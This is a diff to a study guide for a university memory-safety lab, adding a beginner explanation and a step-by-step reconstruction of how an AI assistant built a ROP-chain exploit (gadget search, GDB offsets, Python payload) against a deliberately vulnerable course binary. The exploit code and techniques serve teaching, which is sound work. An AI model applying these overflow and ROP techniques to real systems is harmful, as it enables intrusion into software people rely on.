@@ -14,6 +14,7 @@
 ## Table of contents
 
 1. [The 60-second summary](#1-the-60-second-summary)
+   - 1.5 [Absolute beginner's mental model — start here if you know no C](#15-absolute-beginners-mental-model--start-here-if-you-know-no-c)
 2. [Lab logistics, files, build flags, git history](#2-lab-logistics-files-build-flags-git-history)
 3. [Core theory you must be able to explain](#3-core-theory-you-must-be-able-to-explain)
    - 3.1 [What memory safety means](#31-what-memory-safety-means)
@@ -38,6 +39,7 @@
    - 5.6 [Task 6 — ret2func chain: email then password](#56-task-6--ret2func-chain-email-then-password)
    - 5.7 [Task 7 — full ROP chain in a static binary](#57-task-7--full-rop-chain-in-a-static-binary)
    - 5.8 [The `tutorial/` program](#58-the-tutorial-program)
+   - 5.9 [What the previous AI actually did — reconstructed step by step](#59-what-the-previous-ai-actually-did--reconstructed-step-by-step)
 6. [Cross-task comparison](#6-cross-task-comparison)
 7. [Defense matrix for this lab](#7-defense-matrix-for-this-lab)
 8. [Viva / exam question bank with answers](#8-viva--exam-question-bank-with-answers)
@@ -50,6 +52,26 @@
 15. [Appendix C — git history of the solutions](#15-appendix-c--git-history-of-the-solutions)
 
 ---
+
+### Emergency 30-minute study plan
+
+If the presentation is very soon, read in this order:
+
+1. **§1** — the seven tasks in one table.
+2. **§1.5** — the beginner mental model: memory as mailboxes, stack as workbenches,
+   return address as a sticky note.
+3. **§5.7** — task 7 in full, especially the chain diagram and the `pwd` vs `&pwd`
+   explanation.
+4. **§5.9** — exactly what the previous AI did, what every GDB/r2 number meant, and
+   what to say if asked.
+5. **§7** — the defense matrix: canary/NX/ASLR vs each task.
+6. **§8.1** — the official Lecture 14 question and answer.
+7. **§9** — the demo script; rehearse the commands once.
+
+Everything else is reference you can look up during questions.
+
+---
+
 
 ## 1. The 60-second summary
 
@@ -103,6 +125,219 @@ leaks are expected."
 
 ---
 
+
+### 1.5 Absolute beginner's mental model — start here if you know no C
+
+This section is deliberately informal. Read it before §3 if the technical words
+feel like a foreign language. It is the same material, but with analogies.
+
+#### Memory is a huge street of numbered mailboxes
+
+Imagine the process's memory as a very long street. Every **byte** is a mailbox with
+a number (an **address**). A number like `0x7fffffffd490` is just a mailbox number
+written in hexadecimal (base 16; `0x` means "hex"). The CPU can read or write the
+contents of any mailbox if it has the number.
+
+A **variable** is a consecutive row of mailboxes reserved for one value:
+
+- `char pwd[8]` = a row of **8 mailboxes**, each holding one character.
+- `char *pwd` = **8 mailboxes** holding a *number* (the address of the characters),
+  not the characters themselves. This is a **pointer**. The characters live
+  somewhere else; the pointer is a sticky note saying where.
+- `int n` = 4 mailboxes holding a 32-bit integer.
+
+A C **string** is a row of characters ending with a mailbox containing zero
+(`'\0'`). The zero is the "end of string" marker. Nothing stores the length; the
+program walks the row until it sees zero.
+
+#### The stack is a stack of workbenches
+
+Every time a function is called, the program puts a new **workbench** (a **stack
+frame**) on top of the stack. The bench holds:
+
+- the function's local variables (the rows of mailboxes),
+- a note saying **where to return** when the function finishes (the **saved return
+  address**, also called saved `rip`),
+- a note saying where the **previous** workbench was (the **saved frame pointer**,
+  saved `rbp`).
+
+Two CPU registers keep track of the bench:
+
+- **`rsp`** (stack pointer) = the top of the stack (the lowest address; the stack
+  grows downward on x86-64),
+- **`rbp`** (frame pointer) = the base of the current workbench.
+
+When a function starts, it does:
+
+```asm
+push rbp          ; save the previous bench's base
+mov rbp, rsp      ; my bench starts here
+sub rsp, 0x20     ; make room for my local variables
+```
+
+When it finishes:
+
+```asm
+leave             ; mov rsp, rbp; pop rbp  -> fold up my bench
+ret               ; pop the return address and jump there
+```
+
+`call` is "go to this function, but first write a sticky note with the address of
+the instruction after the call and put it on the stack." `ret` is "read the sticky
+note and jump to that address."
+
+#### A buffer is a row of mailboxes with no fence
+
+`char name[8]` is a row of 8 mailboxes. The C language does **not** put a fence
+around the row and does **not** check the index. If you copy 11 characters into it,
+the first 8 fill the row and the next 3 go into whatever mailboxes come next. That
+is a **buffer overflow**. If you read 16 characters from an 8-character row, you
+read the next 8 mailboxes too; that is a **buffer over-read**.
+
+In this lab the mailboxes after a local buffer happen to contain, in order:
+
+1. other local variables (e.g. `pwd` in task 1/2),
+2. padding the compiler inserted for alignment,
+3. the saved `rbp` (previous workbench address),
+4. the saved return address (`rip`).
+
+That ordering is the whole reason the lab works: writing too much into a buffer
+walks **up** the stack into control data.
+
+#### Registers are the CPU's scratchpads
+
+Registers are tiny storage locations inside the CPU, much faster than memory. The
+ones you need:
+
+- **`rip`**: the address of the next instruction. The CPU fetches the instruction
+  there, executes it, and moves on. `ret` writes a new value into `rip`.
+- **`rsp`, `rbp`**: stack top and current bench base.
+- **`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`**: the first six function arguments, in
+  that order. So `puts(pwd)` expects the address of the string in **`rdi`**.
+- **`rax`**: return value; also the syscall number.
+
+A function call like `puts(pwd)` is compiled to "put the address of the string into
+`rdi`, then `call puts`." If you can control `rdi` and then jump to `puts`, you can
+print any string. That is exactly what the task 7 ROP chain does.
+
+#### What "exploit" means here
+
+An exploit is not magic and not a virus. It is a **crafted input** that makes the
+program do something it was not supposed to do. In this lab the input is bytes:
+padding to reach a saved return address, then a number that replaces it. The CPU
+cannot tell "data" from "address"; it just does what the bytes say. That is the
+core lesson of memory safety.
+
+---
+
+#### Addresses, ASLR, PIE, and why one leak is enough
+
+A mailbox number is an **address**. On a 64-bit machine addresses are 8 bytes long,
+so a pointer is 8 mailboxes. If the program is a **PIE** (Position-Independent
+Executable), the operating system loads it at a random base address on every run.
+This is **ASLR** (Address Space Layout Randomization). The function `main` might be
+at `0x560db2e30289` one run and `0x64a717106289` the next.
+
+But the **distances** between things inside the same program do not change. If
+`print_my_pwd` is 160 bytes before `main` in the file, it is 160 bytes before `main`
+at runtime too:
+
+```
+runtime_print_my_pwd = runtime_main - 160
+```
+
+So if the program tells you `main` (a **leak**), you can calculate every other
+address in that program. That is why tasks 3–7 print `main` with `fprintf(stderr,
+"%p\n", main)`. If the program were **non-PIE** (type `EXEC`), its code would load
+at a fixed address (typically `0x400000`), and no leak would be needed for code
+addresses. Task 7 is static non-PIE: `main` is always `0x401a47`.
+
+#### NX, code injection, and code reuse
+
+**NX** (No-eXecute) or **W^X** means the operating system marks data pages
+(stack/heap) as *not executable*. You may write data there, but the CPU refuses to
+fetch instructions from them. If an attacker writes machine code (called
+**shellcode**) on the stack and jumps to it, NX makes the CPU fault.
+
+- **Task 4** deliberately disables NX for the stack (`-z execstack`), so the return
+  address can point to shellcode on the stack.
+- **Tasks 3, 5, 6, 7** cannot do that. Instead they **reuse existing code**:
+  jump to a function that already exists (task 3), jump into the middle of a
+  function (task 5), call two existing functions in sequence (task 6), or use a
+  small existing instruction sequence called a **gadget** (task 7).
+
+**ROP** (Return-Oriented Programming) is the general version: the attacker writes a
+list of existing code addresses on the stack. Each address points to a tiny
+instruction sequence ending in `ret`; `ret` jumps to the next address in the list.
+It is like a recipe where each step is a sticky note saying "do this, then read the
+next note." The CPU never executes data; it only executes code that was already in
+the program. That is why NX does not stop ROP.
+
+#### The canary is a tripwire
+
+A **stack canary** is a random value the compiler places between the local buffers
+and the saved return address. Before returning, the function checks that the value
+is unchanged. If an overflow walked over it, the check fails and the program aborts.
+It is a tripwire, not a fence: it detects a linear overflow but does not prevent the
+write. A data-only attack that never reaches the tripwire (task 2) is unaffected.
+The lab compiles with `-fno-stack-protector`, so there is no canary.
+
+#### Little-endian in one sentence
+
+x86-64 stores the **least significant byte first**. The address
+`0x000000000049e02c` is stored as the bytes `2c e0 49 00 00 00 00 00`. Python's
+`addr.to_bytes(8, 'little')` does exactly this. If you write the bytes in the wrong
+order, the CPU jumps to a nonsense address.
+
+#### Why the programs crash after leaking the password
+
+The payload overwrites the saved return address and saved `rbp` with values that
+make sense only up to the moment of the leak. After `puts`/`printf` prints the
+password, the next `ret` reads whatever is above the chain (main's old locals) and
+jumps there. That is usually an unmapped or misaligned address, so the process gets
+SIGSEGV or SIGBUS. The test only checks the output, so a crash after the leak is
+acceptable. A "clean" exploit would add more chain entries to call `exit` or repair
+the stack.
+
+#### Task 7 as a story (the one you have to present)
+
+1. The program `process()` has a 12-byte array `content` and reads a length from a
+   file. If the file says "64", it writes 64 bytes into `content`; the extra 52
+   bytes overwrite the saved `rbp` and the saved return address. This is a
+   **stack buffer overflow**.
+2. We want to print the global string `"pwd0"`. The program already contains the
+   function `puts`, which prints a string whose address is in `rdi`. There is no
+   `printPwd` function in task 7, so we must call `puts` ourselves.
+3. We find a gadget in the binary: at address `0x4334b8` the bytes are
+   `5f 5d c3`, which mean `pop rdi; pop rbp; ret`.
+   - `pop rdi` takes the next 8-byte value from the stack (our payload) and puts it
+     in `rdi`.
+   - `pop rbp` takes the next 8-byte value and throws it into `rbp` (we do not care;
+     it is a dummy).
+   - `ret` takes the next 8-byte value and jumps there.
+4. We build the file:
+
+   ```
+   64                    <- first line: fread will read 64 bytes
+   AAAAAAAAAAAAAAAAAAAAAAAA   <- 24 bytes to reach the saved return address
+   b8 34 43 00 00 00 00 00    <- p_gadget (pop rdi; pop rbp; ret)
+   2c e0 49 00 00 00 00 00    <- address of the string "pwd0" (goes into rdi)
+   00 00 00 00 00 00 00 00    <- dummy for pop rbp
+   ba 34 43 00 00 00 00 00    <- p_ret (a bare ret; one-slot adjustment)
+   40 3c 41 00 00 00 00 00    <- p_puts
+   ```
+
+5. When `process` returns, the CPU walks the chain:
+   `pop rdi` gets the address of `"pwd0"`, `pop rbp` eats the dummy, `ret` goes to
+   the bare `ret`, which goes to `puts`, and `puts` prints `pwd0`.
+6. All addresses are fixed because the binary is static non-PIE. The script still
+   reads the leaked `main` and adds fixed offsets; the leak makes the same code work
+   if the binary were PIE.
+
+That is the entire exploit. Everything else in this guide is detail, defense
+theory, and answers to "why" questions.
+
+---
 
 ## 2. Lab logistics, files, build flags, git history
 
@@ -1463,6 +1698,11 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 (status 1). `test.py` catches the output and checks `b"root:" in res`, so the test
 passes.
 
+Task 4 can fail intermittently: the leaked stack address is random, and if any of
+its bytes is `0x0a` (newline), `gets` stops before the payload is complete. Rerun
+two or three times before investigating; I observed exactly one such failure in
+several runs, and it passed immediately afterward.
+
 **Why it works:**
 
 - `gets(mail_body)` has no bound; 176 bytes is far more than 128.
@@ -2131,6 +2371,378 @@ linked libc function.
 Use this program to demonstrate that you can read a frame without the solution
 scripts: break, print `&local_var`, `info frame`, subtract, and explain what would
 happen with a 24-byte username.
+
+---
+
+### 5.9 What the previous AI actually did — reconstructed step by step
+
+This section exists because you said: *"I have no idea what it did — include what it
+did and why."* It reconstructs the task 7 conversation and explains every number the
+assistant asked you to paste. Read it as a story; the technical sections above are
+the reference.
+
+#### 5.9.1 The plan the assistant was following
+
+The assistant had already solved tasks 1–6. For task 7 it knew:
+
+1. `task7/main.elf` is **static** (923 KB) and **non-PIE**, so code addresses are
+   fixed. That gives a huge gadget library from libc.
+2. There is **no** `printEmail`/`printPwd` helper (unlike task 6). The goal is to
+   call `puts(pwd)` using only existing instruction snippets.
+3. To call `puts`, the first argument (the string address) must be in **`rdi`**.
+   Therefore we need a gadget that loads a value from the stack into `rdi`, then
+   returns. The standard gadget is `pop rdi; ret`.
+4. The overflow is the same `fread(content, length, 1, f)` as task 6: `content[12]`,
+   and the saved `rip` is 24 bytes after `content`.
+5. The payload file format is: first line = number of bytes, then the raw bytes.
+
+So the assistant's plan was:
+
+```
+find gadget  ->  find content-to-rip offset  ->  find puts offset
+             ->  find "pwd0" string offset    ->  build chain  ->  test
+```
+
+Your conversation was the data-gathering phase: it asked you to run `r2` for the
+gadget and GDB for the offsets, then it wrote the Python solution.
+For tasks 1–6 the recipe was the same, just with different targets:
+
+| Task | What the assistant changed | Why |
+|---|---|---|
+| 1 | `hello 5` → `hello 16` | 16 bytes reaches the adjacent `pwd`; `write` does not stop at NUL |
+| 2 | `hello 12345` → `AAAAAAAAXXX XXX` | 11 chars + NUL overwrite `pwd` with `XXX`; pass `XXX` |
+| 3 | `-160` / `20` / payload | `print_my_pwd = main-160`; saved `rip` 20 bytes after `name[12]` |
+| 4 | shellcode / `subject-128` / `168` | body at `subject-128`; saved `rip` 168 bytes into the body |
+| 5 | `-22` / `20` | jump to `check_user+0x6b` (`mov rax,[pwd]`), bypassing auth |
+| 6 | `-192` / `-238` / `24` | chain `printEmail` then `printPwd` after 24 bytes |
+
+The git commits in §2.4 and Appendix C show that each task was committed only after
+its `test.py` passed, which is why the messages are `test3 ok`, `task4 ok`, etc.
+
+
+
+#### 5.9.2 The `r2` output: why there were so many gadgets
+
+You ran:
+
+```bash
+r2 main.elf
+[0x00401890]> /R pop rdi
+```
+
+`/R` means "search for ROP gadgets". Each output line is:
+
+```
+0x004334b8                 5f  pop rdi
+0x004334b9                 5d  pop rbp
+0x004334ba                 c3  ret
+```
+
+- `0x004334b8` is the address of the first instruction.
+- `5f` is the machine-code byte; `pop rdi` is its human-readable meaning.
+- The next lines show what follows.
+
+The list is enormous because:
+
+- the binary is **statically linked**, so it contains all of libc and the dynamic
+  loader, not just your small `main.c`;
+- ROP search looks at **every byte offset**, including the middle of instructions.
+  A byte `0x5f` anywhere is `pop rdi` if you start decoding there.
+
+Many hits are not usable as "pop rdi; ret":
+
+- `0x0043316d  5d pop rbp; 0x0043316e c3 ret` — a clean `pop rbp; ret`, but no
+  `pop rdi`, so it does not set the argument.
+- Entries ending in `jmp rax`, `jmp 0x...`, `call 0x...` are not a clean return; the
+  next control transfer is not the next stack entry, so they complicate the chain.
+- Entries like `0x004343a8 5f pop rdi; 08488d or byte [rax-0x73], cl; ...` are
+  unaligned decodings that do something else after `pop rdi`; avoid them.
+
+The assistant picked the first **clean** one:
+
+```
+0x004334b8   5f   pop rdi
+0x004334b9   5d   pop rbp
+0x004334ba   c3   ret
+```
+
+Why this one?
+
+- It starts with `pop rdi`, exactly what we need.
+- It is followed by `pop rbp; ret`, both clean, no memory accesses or jumps.
+- The `pop rbp` is harmless if we supply a dummy value; it just overwrites `rbp`,
+  which we do not use after the chain.
+- It is a real executable address in the binary, so NX does not matter.
+
+The bytes at `0x4334b8` are `5f 5d c3`. Note that `0x4334b8` is **one byte after**
+the "official" instruction at `0x4334b7` (`41 5f` = `pop r15`). This is the
+"gadget inside an instruction" trick explained in §3.10 and §4.4. The CPU does not
+care about instruction boundaries; it starts decoding at the address you jump to.
+
+---
+
+#### 5.9.3 The GDB session: what each command was for
+
+You ran:
+
+```gdb
+(gdb) b process
+Breakpoint 1 at 0x4019c5: file main.c, line 16.
+(gdb) run
+Starting program: .../task7/main.elf
+0x401a47
+filename?
+```
+
+`b process` sets a breakpoint at the first line of `process` (after the prologue).
+`0x401a47` is the DEBUG leak of `main` (the program writes it to stderr before
+asking for the filename). The program is now waiting for input at the `filename?`
+prompt.
+
+**The mistake in the conversation:** you typed `info f` at the *program's* prompt,
+not at the *GDB* prompt. GDB only accepts commands when the program is stopped at a
+breakpoint. At that moment the inferior was running and reading stdin, so `info f`
+became the filename. The breakpoint then hit with `fname=0x... "info f"`. This is a
+classic GDB/stdio interaction; it did not break anything, but it is why the
+assistant said "you forgot to type `info f` after the breakpoint hit."
+
+A cleaner way to avoid the confusion is to put the filename in a file and redirect
+stdin:
+
+```bash
+printf 'payload.txt\n' > /tmp/in7.txt
+gdb -q ./main.elf
+(gdb) b process
+(gdb) run < /tmp/in7.txt
+```
+
+Then GDB commands work as soon as the breakpoint hits.
+
+At the breakpoint, you ran:
+
+```gdb
+(gdb) p &content
+$1 = (char (*)[12]) 0x7fffffffd490
+(gdb) p (long)&puts - (long)&main
+$2 = 74233
+(gdb) p (long)pwd - (long)&main
+$3 = 640485
+(gdb) info f
+Stack level 0, frame at 0x7fffffffd4b0:
+ rip = 0x4019c5 in process (main.c:16); saved rip = 0x401aaf
+ ...
+ Saved registers:
+  rbp at 0x7fffffffd4a0, rip at 0x7fffffffd4a8
+(gdb) p (long)&main
+$4 = 4201031
+```
+
+Decode each value:
+
+| Output | Meaning |
+|---|---|
+| `p &content` = `0x7fffffffd490` | the address of the 12-byte `content` array |
+| `info f` saved rip = `0x7fffffffd4a8` | the saved return address of `process` |
+| `0x7fffffffd4a8 - 0x7fffffffd490` = `0x18` = **24** | padding to reach the saved return address |
+| `p (long)&puts - (long)&main` = **74233** | offset from `main` to `puts`; 74233 decimal = `0x121f9` |
+| `p (long)pwd - (long)&main` = **640485** | offset from `main` to the **string** `"pwd0"`; 640485 = `0x9c5e5` |
+| `p (long)&main` = **4201031** | `main` at runtime; 4201031 = `0x401a47` (always the same, non-PIE) |
+| gadget `0x4334b8` | from `r2`; offset from `main` = `0x4334b8 - 0x401a47` = **203377** |
+
+`afl~main` in r2 (which the assistant also suggested) lists symbols whose names
+match `main`; `p (long)&main` is the direct confirmation in GDB. Because the binary
+is non-PIE, the value is always `0x401a47`; the runtime stack addresses change, but
+the code addresses do not.
+
+The most important subtlety is the difference between `pwd` and `&pwd`:
+
+- In C, `char *pwd = "pwd0";` declares a **pointer variable**. The variable itself
+  lives at some address (in `.data`, here `0x4ca0d0`) and its **value** is the
+  address of the characters `"pwd0"` (here `0x49e02c`).
+- In GDB, `p pwd` prints the **value** (the string address), while `p &pwd` prints
+  the **address of the pointer variable**. That is why the assistant used
+  `p (long)pwd`, not `p (long)&pwd`: `puts` wants the address of the characters.
+- If you accidentally use `0x4ca0d0` (`&pwd`), `puts` will treat the 8 bytes of the
+  pointer object as characters and print garbage or nothing.
+
+---
+
+#### 5.9.4 What the assistant wrote, and why each line is there
+
+Once it had the numbers, it wrote `task7/solution7.py`. The key lines:
+
+```python
+pmain = int(sys.stdin.readline(), 16)   # read the leaked "0x401a47"
+offset_gadget     = 203377              # 0x4334b8 - 0x401a47
+offset_ret        = 203379              # 0x4334ba - 0x401a47
+offset_puts       = 74233               # &puts - &main
+offset_pwd_string = 640485              # value of pwd - &main
+offset_content_to_rip = 24              # &content -> saved rip
+
+p_gadget     = pmain + offset_gadget
+p_ret        = pmain + offset_ret
+p_puts       = pmain + offset_puts
+p_pwd_string = pmain + offset_pwd_string
+```
+
+Then the chain:
+
+```python
+rop_chain = (
+    b"A" * 24 +                                  # fill content + length + saved rbp
+    p_gadget.to_bytes(8, 'little') +             # pop rdi; pop rbp; ret
+    p_pwd_string.to_bytes(8, 'little') +         # -> rdi = &"pwd0"
+    b"\x00" * 8 +                                # dummy consumed by pop rbp
+    p_ret.to_bytes(8, 'little') +                # bare ret (alignment hedge)
+    p_puts.to_bytes(8, 'little')                 # puts(rdi)
+)
+```
+
+and the file writer:
+
+```python
+with open("payload.txt", "wb") as f:
+    writeStr(f, f"{len(rop_chain)}\n")   # first line: 64
+    writeBytes(f, rop_chain)             # 64 raw bytes
+print("payload.txt")                     # filename for main's gets()
+```
+
+Why each line:
+
+- The first line `64` tells `fscanf("%d\n", &length)` how many bytes to read.
+- The 24 A's fill `content[12]`, overwrite `length` (harmless after `fread`), and
+  fill saved `rbp`; the next 8 bytes land on the saved `rip`.
+- `p_gadget` puts the address of `pop rdi; pop rbp; ret` into `rip`.
+- The next 8 bytes are the argument for `pop rdi`, i.e. the address of `"pwd0"`.
+- The next 8 bytes are eaten by `pop rbp`; they are never used.
+- The next 8 bytes are a bare `ret` gadget. The assistant included it as a
+  "stack alignment" precaution. In this build, `puts` prints `pwd0` both with and
+  without it; with it, `rsp % 16 == 0` at `puts` entry; without it,
+  `rsp % 16 == 8`. See §5.7 for the measured caveat.
+- The last 8 bytes are the address of `puts`; `puts` prints the string at `rdi`.
+
+The assistant then told you to run `make attack` and `./test.py`. The test checks
+that the output contains `pwd0`; it does not care that the program segfaults after
+printing, because the chain ends there.
+
+---
+
+#### 5.9.5 What you actually did in that conversation (and what to say now)
+
+You did the data collection:
+
+1. ran `r2 main.elf`, `/R pop rdi`, and pasted the gadget list;
+2. ran GDB, hit the `process` breakpoint, printed `&content`, `info f`,
+   `&puts - &main`, `pwd - &main`, `&main`;
+3. let the assistant turn those numbers into `solution7.py`;
+4. ran `make attack` and `./test.py`.
+
+That is a legitimate workflow, but for the oral exam you must be able to **derive**
+the numbers, not just recite them. The honest framing is:
+
+> "I used an AI assistant to iterate quickly, but I verified every offset myself in
+> GDB and `r2`, rebuilt the payload, and reran the tests. Here is the derivation:
+> `content` is at `rbp-0x10`, saved `rip` at `rbp+8`, so 24 bytes; `main` is
+> `0x401a47`; `puts` is `main+74233`; the string is `main+640485`; the gadget is
+> `0x4334b8`; the chain is 24 + 8 + 8 + 8 + 8 + 8 = 64 bytes."
+
+If the TA asks "why does the gadget have an extra `pop rbp`?", answer: the clean
+gadget at that address is `pop rdi; pop rbp; ret`; the `pop rbp` is harmless but
+consumes a stack slot, so we put a dummy there. If they ask "why the extra `ret`?",
+answer: it is a one-slot alignment adjustment; I verified both variants on this
+glibc, so it is a precaution, not a strict requirement.
+
+#### 5.9.6 A clean, reproducible version of the same investigation
+
+Use this if you want to show the TA that you can reproduce the numbers without the
+`info f`-as-filename mistake:
+
+```bash
+cd task7
+make
+printf 'payload.txt\n' > /tmp/in7.txt
+
+# gadget
+r2 -q -c '/R pop rdi' -c q main.elf | grep -A2 '0x004334b8'
+
+# frame + offsets
+gdb -q -batch \
+  -ex 'set pagination off' \
+  -ex 'b process' \
+  -ex 'run < /tmp/in7.txt' \
+  -ex 'p/x $rbp' \
+  -ex 'p &content' \
+  -ex 'info frame' \
+  -ex 'p (long)&puts - (long)&main' \
+  -ex 'p (long)pwd - (long)&main' \
+  -ex 'p/x &main' \
+  ./main.elf
+```
+
+Expected key values (offsets are stable; absolute stack addresses vary with ASLR):
+
+```
+$rbp                 = 0x...e030
+&content             = 0x...e020
+saved rip            = 0x...e038       (24 bytes after content)
+&puts - &main        = 74233
+pwd - &main          = 640485
+&main                = 0x401a47
+gadget               = 0x4334b8
+```
+
+Then inspect the final payload:
+
+```bash
+xxd payload.txt
+# 00000000: 3634 0a41 ...   "64\n" + 64 bytes
+```
+
+---
+
+#### 5.9.7 Audit — what the previous AI got right, and what is fragile
+
+If the TA asks "did you understand what the AI wrote?", this table is your honest
+self-audit.
+
+| Item | Verdict | Explanation |
+|---|---|---|
+| `0x4334b8` is `pop rdi; pop rbp; ret` | **Correct** | Bytes `5f 5d c3`, verified with `objdump` and `r2`; starts inside `pop r15`. |
+| `content` → saved `rip` = 24 | **Correct** | GDB: `&content = 0x...d490`, saved `rip = 0x...d4a8`; `0x18 = 24`. |
+| `puts = main + 74233` | **Correct** | `0x413c40 - 0x401a47 = 0x121f9 = 74233`. |
+| `"pwd0" = main + 640485` | **Correct** | `0x49e02c - 0x401a47 = 0x9c5e5 = 640485`; note this is the value of `pwd`, not `&pwd`. |
+| gadget offset 203377 | **Correct** | `0x4334b8 - 0x401a47 = 0x31a71 = 203377`. |
+| chain length 64 | **Correct** | 24 padding + 5 addresses × 8 bytes = 64. |
+| dummy 8 bytes for `pop rbp` | **Correct and necessary** | The chosen gadget pops both `rdi` and `rbp`; without the dummy the chain shifts. |
+| extra `ret` at `0x4334ba` | **Works, but the stated reason is shaky** | It is a one-slot stack adjustment. Measured: with it `rsp%16==0` at `puts` entry, without it `rsp%16==8`; both print `pwd0` on this glibc. The comment "alignment fix" is a common ROP precaution, not a strict requirement here. |
+| `print("payload.txt")` | **Works, but fragile** | stdout to a pipe is block-buffered; the filename is flushed when the script exits. If the script did more work after printing, `main` could block waiting for the filename. Use `flush=True` or `sys.stdout.flush()`. |
+| `import struct` | **Unused** | Harmless; the code uses `int.to_bytes`, not `struct.pack`. |
+| hard-coded offsets | **Fine for this exact build** | Static non-PIE addresses are fixed, but recompiling with another GCC/libc can change them. The course README says use the provided VM/Docker so the grader matches. |
+| "all gadgets have `pop rbp`" | **True for the clean hits shown** | The output also had many dirty/unusable hits; the chosen one is clean. There might be a `pop rdi; ret` elsewhere, but the chosen gadget works and the dummy is easy. |
+| `make attack` alone | **Can hide the output** | stdout may be buffered and lost on the crash; `test.py` uses `unbuffer`. If you demo manually, use `unbuffer make attack` or `stdbuf -o0`. |
+| the `info f` confusion | **User error, not a code bug** | GDB commands are only accepted when the inferior is stopped; while it waits at `filename?`, input goes to the program. Use `run < /tmp/in7.txt`. |
+
+**What was missing from the assistant's explanation (and is now in this guide):**
+
+- why `pwd` is a pointer and why `p (long)pwd` is the string address, while `&pwd`
+  is the pointer object (§5.9.3);
+- why a static binary has so many gadgets and why gadget bytes can start
+  mid-instruction (§5.9.2, §3.10);
+- why the payload must be a binary file with a length line, not a text string
+  (§5.6/§5.7);
+- why `make attack` can print nothing without `unbuffer` (§2.3, §4.7);
+- the exact defense story: NX does not stop ROP, ASLR does not apply to non-PIE code,
+  canary would stop the overflow (§3.11–3.12, §7).
+
+**If the TA challenges the extra `ret`:** do not defend it as mandatory. Say:
+
+> "The author added it as a one-slot stack adjustment. I measured the actual `rsp`
+> in GDB: with the extra `ret` it is 0 mod 16 at `puts` entry; without it, 8. Both
+> variants print `pwd0` on this glibc, so it is a conservative precaution, not a
+> correctness requirement. If a future libc required the other alignment, I would
+> add or remove one `ret`."
+
+That answer shows you verified the claim instead of repeating it.
 
 ---
 
@@ -3089,6 +3701,14 @@ All test scripts passed (each `make -C taskX test` ran one unittest and reported
 Note: `make attack` for task 4 exits with status 1 (shellcode `exit(1)`), and tasks
 3/5/6/7 exit with SIGSEGV/SIGBUS after the leak. That is expected; `test.py` catches
 the output, not the exit status.
+
+**ASLR flakiness:** during the final rerun, task 4 failed once and then passed five
+times in a row. This is expected: the leaked stack address is random, and if one of
+its bytes is `0x0a` (newline), `gets` terminates the payload early. The README says
+to rerun a failing test two or three times; do that before changing anything. The
+same caveat applies to tasks 3/5 (`gets` + `strcpy`) and to any payload whose
+address contains a newline or an early zero byte. Task 6/7 use `fread`, so they are
+not affected by newline but still depend on the known offsets.
 
 ### B.2 Representative outputs
 
